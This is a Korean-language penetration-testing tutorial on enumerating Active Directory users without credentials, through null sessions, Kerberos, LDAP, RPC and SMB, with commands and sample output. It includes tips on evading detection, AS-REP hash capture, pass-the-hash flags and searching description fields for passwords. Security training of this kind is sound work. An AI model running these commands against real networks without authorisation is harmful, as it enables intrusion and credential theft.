## Null Session 개념

Null Session은 Windows가 네트워크 리소스 공유를 위해 기본적으로 허용하는 익명 연결 기능이다. 원래 의도된 기능이지만 이 연결을 악용하면 인증 없이도 SAMR(Security Account Manager Remote Protocol), LSARPC(Local Security Authority Remote Protocol) 등의 파이프에 접근해 도메인 사용자 목록, 그룹 구조, SID, 패스워드 정책 등 민감한 정보를 열거할 수 있다. SMB, LDAP, RPC, NetBIOS 등 Windows 인증을 사용하는 모든 프로토콜에 영향을 미친다는 점에서 단순한 프로토콜 취약점이 아니라 Windows 인증 레이어 전체의 문제다.

현대 환경에서는 대부분 차단되어 있지만, 연결 자체는 허용하면서 실제 조회만 막아두는 경우가 많아 연결 성공 여부로 판단해서는 안 된다. 실제 데이터가 반환되는지 확인해야 한다.

## kerbrute (가장 빠름 — 이벤트 최소화)

kerbrute는 Kerberos 사전 인증 과정을 이용해 유저명 유효성을 확인하는 도구다. 동작 원리는 KDC(Key Distribution Center)에 각 유저명으로 AS-REQ를 보내고 응답 코드로 계정 존재 여부를 판별하는 것이다. 유효한 유저명이면 `KDC_ERR_PREAUTH_REQUIRED` 오류가 반환되고, 존재하지 않는 유저면 `KDC_ERR_C_PRINCIPAL_UNKNOWN`이 반환된다. 이 차이를 이용해 패스워드를 전혀 시도하지 않고도 유효한 계정 목록을 뽑을 수 있다.

SMB/LDAP 방식과 달리 `badPwdCount`가 증가하지 않아 락아웃 위험이 없다. 또한 실패 이벤트가 Event ID 4771(Kerberos pre-authentication failed)로 기록되는데, 많은 환경에서 이 이벤트를 모니터링하지 않아 상대적으로 탐지 가능성이 낮다. 단, 고속 열거는 KDC 쿼리를 대량 발생시켜 탐지될 수 있으므로 스레드 수를 적절히 조절하는 것이 좋다.

```bash
# 기본 유저명 열거 — 가장 많이 쓰는 대형 리스트
kerbrute userenum \
  -d corp.local \
  --dc <DC_IP> \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# 빠른 소규모 리스트 — 초기 정찰 단계
kerbrute userenum \
  -d corp.local \
  --dc <DC_IP> \
  /usr/share/seclists/Usernames/Names/names.txt

# 스레드 수 조절 (기본 10, 높이면 빠르지만 노이즈 증가)
kerbrute userenum \
  -d corp.local \
  --dc <DC_IP> \
  --threads 20 \
  users.txt

# 결과를 파일로 저장
kerbrute userenum \
  -d corp.local \
  --dc <DC_IP> \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  --output valid_users.txt

# 특이점: DONT_REQ_PREAUTH 계정이 있으면 자동으로 AS-REP 해시도 함께 출력
# -> AS-REP Roasting 가능 계정을 동시에 발견할 수 있음
```

출력 예시:

```
2025/01/01 12:00:00 >  [+] VALID USERNAME: administrator@corp.local
2025/01/01 12:00:01 >  [+] VALID USERNAME: john@corp.local
2025/01/01 12:00:01 >  [+] john has no pre auth required. Getting AS-REP
$krb5asrep$23$john@CORP.LOCAL:...
```

## LDAP 익명 열거

LDAP 익명 바인딩이 허용된 환경에서는 인증 없이 디렉터리를 직접 쿼리할 수 있다. kerbrute보다 훨씬 많은 정보를 한 번에 얻을 수 있으며, description 필드에 패스워드가 평문으로 적혀있는 경우도 실전에서 자주 발견된다.

`ldapsearch`는 `-x` 옵션으로 익명 바인딩을 사용하고, `-b`로 검색 시작 지점(Base DN)을 지정한다. Base DN을 모를 때는 `-s base namingContexts`로 먼저 확인한다.

```bash
# Base DN 확인 (도메인 구조 파악)
ldapsearch -x -H ldap://<DC_IP> -s base namingContexts

# -o nettimeout: 네트워크 연결 타임아웃 (초)
# -o timelimit: 검색 결과 대기 타임아웃 (초)
ldapsearch -x -H ldap://<DC_IP> \
  -o nettimeout=10 \
  -o timelimit=30 \
  -s base namingContexts

# 익명 바인딩 — 모든 사용자 열거
ldapsearch -x -H ldap://<DC_IP> \
  -b "DC=corp,DC=local" \
  "(objectClass=user)" \
  sAMAccountName

# 결과에서 유저명만 추출해서 파일로
ldapsearch -x -H ldap://<DC_IP> \
  -b "DC=corp,DC=local" \
  "(objectClass=user)" \
  sAMAccountName 2>/dev/null \
  | grep "sAMAccountName:" \
  | awk '{print $2}' > users.txt

# description 필드 포함 (패스워드 적혀있는 경우 발견됨)
ldapsearch -x -H ldap://<DC_IP> \
  -b "DC=corp,DC=local" \
  "(objectClass=user)" \
  sAMAccountName description

# 활성화된 사용자만 (userAccountControl 비트 필터)
ldapsearch -x -H ldap://<DC_IP> \
  -b "DC=corp,DC=local" \
  "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
  sAMAccountName

# 자격증명 있을 때 — 훨씬 더 많은 속성 접근 가능
ldapsearch -x -H ldap://<DC_IP> \
  -D "corp\john" -w 'Password1!' \
  -b "DC=corp,DC=local" \
  "(objectClass=user)" \
  sAMAccountName description memberOf lastLogon

# LDAPS (636포트) 사용
ldapsearch -x -H ldaps://<DC_IP>:636 \
  -b "DC=corp,DC=local" \
  "(objectClass=user)" \
  sAMAccountName
```

## rpcclient (Null Session / RPC 열거)

rpcclient는 SMB를 통해 IPC$ 공유에 연결한 뒤 SAMR, LSARPC 파이프에 직접 접근하는 도구다. Null Session이 허용된 환경에서는 인증 없이도 방대한 도메인 정보를 조회할 수 있다. `-U ""` 는 빈 유저명, `-N`은 패스워드 없음을 의미한다.

```bash
# 익명 연결
rpcclient -U "" -N <DC_IP>

# 자격증명 있을 때
rpcclient -U "john%Password1!" <DC_IP>
rpcclient -U "corp\john%Password1!" <DC_IP>

# 연결 후 사용 가능한 주요 명령어들
rpcclient $> querydominfo        # 도메인 기본 정보 (이름, 유저/그룹 수, 패스워드 정책)
rpcclient $> enumdomusers        # 도메인 사용자 전체 목록 + RID
rpcclient $> enumdomgroups       # 도메인 그룹 전체 목록 + RID
rpcclient $> enumalsgroups builtin  # Builtin 로컬 그룹
rpcclient $> enumalsgroups domain   # 도메인 로컬 그룹
rpcclient $> queryuser 0x1f4     # RID 500(0x1f4) = Administrator 상세 정보
rpcclient $> querygroup 0x200    # RID 512(0x200) = Domain Admins 상세
rpcclient $> queryusergroups 0x1f4  # 특정 유저가 속한 그룹
rpcclient $> getdompwinfo        # 패스워드 정책 (최소 길이, 복잡도 등)
rpcclient $> getusrdompwinfo 0x1f4  # 특정 유저의 패스워드 정책
rpcclient $> lsaquery            # 도메인 SID 획득
rpcclient $> lookupsids S-1-5-21-...-500  # SID로 계정명 조회
rpcclient $> lookupnames Administrator    # 계정명으로 SID/RID 조회
rpcclient $> querydispinfo       # 유저 표시 정보 (이름, 설명 등)
rpcclient $> netshareenum        # 공유 목록
rpcclient $> netshareenumall     # 숨김 공유 포함 전체 공유

# 연결 없이 단일 명령 실행 (-c 옵션)
rpcclient -U "" -N <DC_IP> -c "enumdomusers"
rpcclient -U "" -N <DC_IP> -c "querydominfo; getdompwinfo; enumdomusers"

# 유저 목록만 깔끔하게 추출
rpcclient -U "" -N <DC_IP> -c "enumdomusers" 2>/dev/null \
  | grep -oP '\[.*?\]' \
  | grep -v "0x" \
  | tr -d '[]' > users.txt
```

## nxc — SMB RID Brute

SMB 프로토콜(445포트)로 IPC$에 익명 연결한 뒤 SAMR 파이프를 통해 RID(Relative Identifier)를 500번부터 순차적으로 대입해 계정 이름, SID, 타입(User/Group/Alias)을 열거하는 방식이다. RID 500은 기본 Administrator, 501은 Guest, 512는 Domain Admins 그룹이며, 1000번대 이후가 일반 계정이다. 브루트포스 방식이라 속도가 느리지만 LDAP이 막혀있거나 kerbrute가 차단된 환경에서 대안으로 쓴다.

Null Session 연결 자체는 성공해도 SAMR 파이프 접근이 막힌 경우 `STATUS_ACCESS_DENIED` 오류가 발생한다. 이때는 자격증명이 있으면 그걸 사용하면 된다.

```bash
# 익명 (Null Session)
nxc smb <DC_IP> -u '' -p '' --rid-brute

# RID 범위 지정 (기본 4000까지, 계정 많은 환경은 늘려야 함)
nxc smb <DC_IP> -u '' -p '' --rid-brute 6000

# 자격증명 있을 때
nxc smb <DC_IP> -u 'john' -p 'Password1!' --rid-brute

# NTLM 해시로
nxc smb <DC_IP> -u 'john' -H <NTLM> --rid-brute

# 유저만 필터 (SidTypeUser만 추출)
nxc smb <DC_IP> -u '' -p '' --rid-brute 2>/dev/null \
  | grep "SidTypeUser" \
  | awk -F'\' '{print $NF}' \
  | awk '{print $1}' > users.txt
```

출력 예시:

```
SMB  10.10.10.10  445  DC  500: CORP\Administrator (SidTypeUser)
SMB  10.10.10.10  445  DC  501: CORP\Guest (SidTypeUser)
SMB  10.10.10.10  445  DC  512: CORP\Domain Admins (SidTypeGroup)
SMB  10.10.10.10  445  DC  1104: CORP\john (SidTypeUser)
```

## nxc — LDAP –users

LDAP 프로토콜(389포트)로 익명 바인딩 후 디렉터리를 직접 쿼리해 사용자 목록을 한 번에 덤프하는 방식이다. RID Brute보다 속도가 훨씬 빠르고 이름 외에도 description, badPwdCount, badPasswordTime, pwdLastSet, lastLogon 등 공격에 유용한 속성까지 함께 반환한다. 특히 description 필드에 패스워드가 평문으로 적혀있는 계정이 실전에서 종종 발견되며, badPwdCount로 패스워드 스프레이 전 락아웃 위험 계정을 사전에 파악할 수 있다.

```bash
# 익명 (Null Session)
nxc ldap <DC_IP> -u '' -p '' --users

# 자격증명 있을 때
nxc ldap <DC_IP> -u 'john' -p 'Password1!' --users

# NTLM 해시로
nxc ldap <DC_IP> -u 'john' -H <NTLM> --users

# 유저명만 추출해서 파일로
nxc ldap <DC_IP> -u 'john' -p 'Password1!' --users 2>/dev/null \
  | grep -oP 'CORP\\[A-Za-z0-9._-]+' \
  | awk -F'\' '{print $2}' > users.txt

# description 필드 확인 (패스워드 노출 여부)
nxc ldap <DC_IP> -u 'john' -p 'Password1!' --users 2>/dev/null \
  | grep -i "desc:"
```

## enum4linux-ng

enum4linux-ng는 SMB/RPC/LDAP을 통해 도메인 정보를 자동으로 종합 수집하는 래퍼 툴이다. 내부적으로 rpcclient, ldapsearch, smbclient 등을 호출하고 결과를 정리해준다. 초기 정찰에서 한 번에 많은 정보를 수집할 때 유용하며, YAML이나 JSON으로 결과를 저장해 나중에 파싱하기 쉽다.

```bash
# 전체 정보 수집 (-A = All)
enum4linux-ng -A <DC_IP>

# 결과를 YAML 파일로 저장
enum4linux-ng -A <DC_IP> -oY results.yaml

# JSON으로 저장
enum4linux-ng -A <DC_IP> -oJ results.json

# 자격증명 있을 때
enum4linux-ng -A <DC_IP> -u john -p 'Password1!'

# 사용자만 (-U)
enum4linux-ng -U <DC_IP>

# 패스워드 정책만 (-P)
enum4linux-ng -P <DC_IP>

# 공유만 (-S)
enum4linux-ng -S <DC_IP>
```

수집 항목: 도메인 정보, 유저 목록, 그룹 목록, 공유 목록, 패스워드 정책, OS 정보, RPC 정보

## Impacket GetADUsers

GetADUsers는 LDAP을 통해 AD 유저 정보를 조회하는 impacket 스크립트다. 특히 `-all` 플래그로 비활성화된 계정까지 포함한 전체 목록을 뽑을 수 있고, lastLogon, badPwdCount 등의 속성도 함께 출력한다.

```bash
# 익명
impacket-GetADUsers -all corp.local/ -dc-ip <DC_IP>

# 자격증명
impacket-GetADUsers corp.local/john:'Password1!' -dc-ip <DC_IP> -all

# NTLM 해시로
impacket-GetADUsers -hashes :<NTLM> corp.local/john -dc-ip <DC_IP> -all

# 비활성 계정 제외
impacket-GetADUsers corp.local/john:'Password1!' -dc-ip <DC_IP>
```

## windapsearch

windapsearch는 LDAP 열거에 특화된 도구로, AD 특화 필터와 출력 형식을 제공한다. 특히 `-m`으로 모듈을 선택해 용도별로 쿼리할 수 있다.

```bash
# 전체 유저 열거
windapsearch -d corp.local --dc-ip <DC_IP> -u john -p 'Password1!' -m users

# 관리자 그룹 멤버
windapsearch -d corp.local --dc-ip <DC_IP> -u john -p 'Password1!' -m privileged-users

# 컴퓨터 계정
windapsearch -d corp.local --dc-ip <DC_IP> -u john -p 'Password1!' -m computers

# 익명
windapsearch -d corp.local --dc-ip <DC_IP> -u "" -p "" -m users
```
